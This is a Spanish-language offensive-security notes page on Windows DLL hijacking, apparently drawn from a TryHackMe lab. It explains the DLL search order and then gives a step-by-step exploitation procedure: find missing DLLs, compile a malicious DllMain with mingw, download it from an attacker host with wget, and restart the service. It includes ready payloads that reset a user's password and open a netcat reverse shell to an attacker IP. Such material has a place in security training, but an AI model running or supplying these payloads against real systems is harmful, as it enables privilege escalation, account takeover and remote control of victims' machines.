# DLL hijacking (DLL path abuse)

## DLL Hijacking

*   Orden de búsqueda de DLL

    \<aside> 💡 En resumen, para las aplicaciones de escritorio estándar, Windows seguirá uno de los órdenes que se enumeran a continuación dependiendo de si SafeDllSearchMode está habilitado o no.

    Si **SafeDllSearchMode** está habilitado, el orden de búsqueda es el siguiente:

    1. El directorio desde el que se cargó la aplicación.
    2. El directorio del sistema. Utilice la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.
    3. El directorio del sistema de 16 bits. No hay ninguna función que obtenga la ruta de este directorio, pero se busca.
    4. El directorio de Windows. Utilice la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
    5. El directorio actual.
    6. Los directorios que se enumeran en la variable de entorno PATH. Tenga en cuenta que esto no incluye la ruta por aplicación especificada por la clave de registro de **App Paths .** La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL .

    Si **SafeDllSearchMode** está deshabilitado, el orden de búsqueda es el siguiente:

    1. El directorio desde el que se cargó la aplicación.
    2. El directorio actual.
    3. El directorio del sistema. Utilice la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.
    4. El directorio del sistema de 16 bits. No hay ninguna función que obtenga la ruta de este directorio, pero se busca.
    5. El directorio de Windows. Utilice la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
    6. Los directorios que se enumeran en la variable de entorno PATH. Tenga en cuenta que esto no incluye la ruta por aplicación especificada por la clave de registro de **App Paths .** La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL . \</aside>
*   Guía de explotación

    ```powershell
    # Ver si hay DLL faltantes que sean requerido por aplicativos
    Process Monitor (ProcMon)
    ```

    ProcMon requerirá privilegios administrativos para funcionar, esta no es una vulnerabilidad que pueda descubrir en el sistema de destino. Si desea verificar cualquier software en busca de posibles vulnerabilidades de secuestro de DLL, deberá instalar el software en su entorno de prueba y realizar una investigación allí.

    La siguiente captura de pantalla le muestra qué buscar en la interfaz de ProcMon. Verá que algunas entradas dieron como resultado "NOMBRE NO ENCONTRADO".

    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2bffcc52df1b20dd298154b4da9b52ae.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2bffcc52df1b20dd298154b4da9b52ae.png)

    Las dos últimas líneas de la captura de pantalla anterior muestran que dllhijackservice.exe está intentando iniciar hijackme.dll en la carpeta "C:\Temp" pero no puede encontrar este archivo. Este es un caso típico de un archivo DLL faltante.

    {% code overflow="wrap" %}
    ```powershell
    # El segundo paso del ataque consistirá en que creemos este archivo en esa ubicación específica. Es importante que tengamos permisos de escritura para cualquier carpeta que deseemos usar para el secuestro de DLL. 

    #En este caso, la ubicación es la carpeta Temp para la que casi todos los usuarios tienen permisos de escritura; si se tratara de una carpeta diferente, tendríamos que comprobar los permisos.
    ```
    {% endcode %}

    **Creando el archivo  malicioso**

    Como se mencionó anteriormente, los archivos DLL son archivos ejecutables. Serán ejecutados por el archivo ejecutable y se ejecutarán los comandos que contienen. El archivo DLL que crearemos podría ser un shell inverso o un comando del sistema operativo según lo que queramos lograr en el sistema de destino o según las limitaciones de configuración. El siguiente ejemplo es un archivo DLL esqueleto que puede adaptar según sus necesidades.

    Código esqueleto para la DLL maliciosa: windows\_dll.c

    ```
    #include <windows.h>

    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k whoami > C:\\\\Temp\\\\dll.txt");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

    Dejando a un lado las partes repetitivas, puede ver que este archivo ejecutará el `whoami`comando ( `cmd.exe /k whoami`) y guardará la salida en un archivo llamado "dll.txt".

    El compilador mingw se puede usar para generar el archivo DLL con el siguiente comando y con el nombre que requerimos, que es hijackme.dll que vimos que busca el servicio:

    ```powershell
    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
    ```

    \<aside> 💡 Puede instalar fácilmente el compilador Mingw usando el comando apt install gcc-mingw-w64-x86-64

    \</aside>

    Una vez compilado, necesitaremos mover el archivo hijackme.dll a la carpeta Temp en nuestro sistema target. Puede usar el siguiente comando de PowerShell para descargar el archivo .dll en el sistema de destino:

    ```powershell
    wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
    ```

    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/6dd2070eda0924f1b6d601e63301fe05.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/6dd2070eda0924f1b6d601e63301fe05.png)

    Tendremos que detener e iniciar el servicio dllsvc nuevamente usando el siguiente comando:

    `sc stop dllsvc & sc start dllsvc`

    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a5fc76aa33e941941182d36a6c83e11f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a5fc76aa33e941941182d36a6c83e11f.png)

    Puede conectarse a la máquina de destino usando RDP en su máquina atacante o iniciándolo directamente desde su navegador.

Procedimiento:

{% code overflow="wrap" %}
```powershell
# 1. Ver si hay DLL faltantes que sean requerido por aplicativos
Process Monitor (ProcMon)

# 2. Crear archivo.c con código que queremos como payload
nano windows_dll.c   # ver abajo payloads

# 3. Compilarlo el .c en DLL nombrándolo como el DLL que necesita algún servicio, según detectamos anteriormente con ProcMon
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

# 4. Descargarlo en Temp o en directorio que cualquiera pueda ejecutar
wget -O hijackme.dll Attacker_IP:PORT/hijackme.dll

# 5. Detener y reiniciar el servicio que va a utilizar el dll
sc stop <servicio> & sc start <servicio>

# El servicio ejecutará el DLL
```
{% endcode %}

*   Ejemplos

    Este script c cambia la contraseña de un usuario a la que queremos. Debemos indicar nombre del output dll.txt

    ```c
    #include <windows.h>

    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k net user jack Password11");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

    Reverse shell ejecutando netcat, rrequiere tener un exe de netcat en el windows target:

    ```c
    #include <windows.h>

    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k nc.exe -e cmd.exe <Attacker_IP> <PORT>");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

    Shells windows:

    [Shells - Windows](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows)
